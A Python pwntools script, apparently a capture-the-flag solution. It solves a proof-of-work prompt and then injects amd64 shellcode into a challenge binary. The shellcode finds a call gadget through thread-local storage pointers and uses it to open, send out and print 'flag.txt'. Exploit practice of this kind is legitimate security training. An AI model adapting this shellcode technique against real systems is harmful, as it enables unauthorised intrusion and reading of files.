from pwn import *
import hashlib

# this code is provided to solve the PROOF OF WORK on remote (to discourage brute-forcing)
def pow_solver(p):
    p.recvuntil(b"sha256(")
    challenge = p.recvuntil(b" + ", drop=True)
    p.recvuntil(b"(")
    difficulty = int(p.recvuntil(b")", drop=True))
    answer = 0
    log.info(f"finding pow for {challenge.decode()}, {difficulty}")
    while True:
        answer += 1
        h = hashlib.sha256()
        h.update(challenge + str(answer).encode())
        bits = ''.join(bin(i)[2:].zfill(8) for i in h.digest())
        if bits.startswith('0' * difficulty):
            break
    p.sendlineafter(b"answer: ", str(answer).encode())
    log.success("PoW solved!")


context.arch = "amd64"
if args.REMOTE:
    p = remote("localhost", 34568)
    pow_solver(p)
else:
    p = process("./chall")

sc = asm("""
mov rsp, fs:0x300
mov rbx, fs:0x0
add rbx, 0x093bd6
push rcx
movabs rcx, 0x7478742e67616c66
push rcx
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
call rbx
mov rsi, rax
mov rdi, 1
mov rdx, 0
mov r10, 100
mov rax, 40
call rbx
mov rax, 60
call rbx
""")

p.sendline(sc)
p.interactive()
